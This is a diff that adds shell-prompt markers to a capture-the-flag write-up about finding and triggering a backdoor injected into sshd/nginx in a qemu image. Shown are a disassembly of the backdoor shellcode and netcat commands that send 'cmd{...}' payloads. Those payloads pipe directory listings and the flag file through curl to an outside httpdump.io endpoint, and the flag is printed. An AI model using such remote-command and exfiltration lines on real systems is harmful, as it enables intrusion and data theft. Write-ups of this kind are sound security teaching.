@@ -7,12 +7,12 @@ Please identify the backdoor and validate your findings against our test instanc
 ## Pre-Requisites
 This challenge consists of a qcow2 image, that needs qemu to run. In case qemu isn't installed, yet, now is a good time to do so. ;-)
 ```
-sudo apt install qemu-system-x86
+$ sudo apt install qemu-system-x86
 ```
 
 qemu-img can be used to list snapshots of this image.
 ```
-qemu-img snapshot -l art_ctf_injector_local.qcow2 
+$ qemu-img snapshot -l art_ctf_injector_local.qcow2 
 Snapshot list:
 ID        TAG               VM SIZE                DATE     VM CLOCK     ICOUNT
 1         compromised       452 MiB 2021-01-13 20:15:55 00:02:17.632           
@@ -20,7 +20,7 @@ ID        TAG               VM SIZE                DATE     VM CLOCK     ICOUNT
 
 The run.sh script uses qemu-system-x86_64 to run the image.
 ```
-./run.sh 
+$ ./run.sh 
 Restoring snapshot compromised (art_ctf_injector_local.qcow2)
 Press Return...
 ```
@@ -251,7 +251,7 @@ But what does the shellcode do?
 *Note: The output of radare2 has been edited with additional comments for better readability.*
 
 ```
-r2 -a x86 -b 64 -qc pd shellcode_unpatched.bin
+$ r2 -a x86 -b 64 -qc pd shellcode_unpatched.bin
             0x00000000      48b841414141.  movabs rax, 0x4141414141414141 ; VA of malloc_usable_size()
             0x0000000a      4155           push r13
             0x0000000c      49bd43434343.  movabs r13, 0x4343434343434343 ; VA of system()
@@ -326,7 +326,7 @@ Now we know the trigger for the code execution in backdoored processes: put cmd{
 Assumption: The sshd/nginx process in the qemu image might have been backdoored with the injector.sh script.
 Test with nginx listening on tcp port 4321:
 ```
-nc 0 4321
+$ nc 0 4321
 cmd{echo bla > /tmp/bla}
 ```
 
@@ -346,7 +346,7 @@ There is one additional obstacle to climb over though: There is no echoing back 
 There are different ways to redirect the RCE output to a listener under your control. One could be a netcat listener on a public routable IP address. In case you are missing one (due to NAT), you could set up a temporary HTTP endpoint at httpdump.io.
 For this CTF, i used https://httpdump.io/hwie_
 ```
-nc injector.challenges.adversary.zone 4321
+$ nc injector.challenges.adversary.zone 4321
 cmd{ls -l | curl -X POST --data-binary @- https://httpdump.io/hwie_}
 ```
 
@@ -382,7 +382,7 @@ drwxr-xr-x  13 root root  4096 Dec 30 18:16 var
 
 ## Now it's Flag Time!
 ```
-nc injector.challenges.adversary.zone 4321
+$ nc injector.challenges.adversary.zone 4321
 cmd{cat flag.txt | curl -X POST --data-binary @- https://httpdump.io/hwie_}
 ```
 Flag: **CS{fr33_h00k_b4ckd00r}**
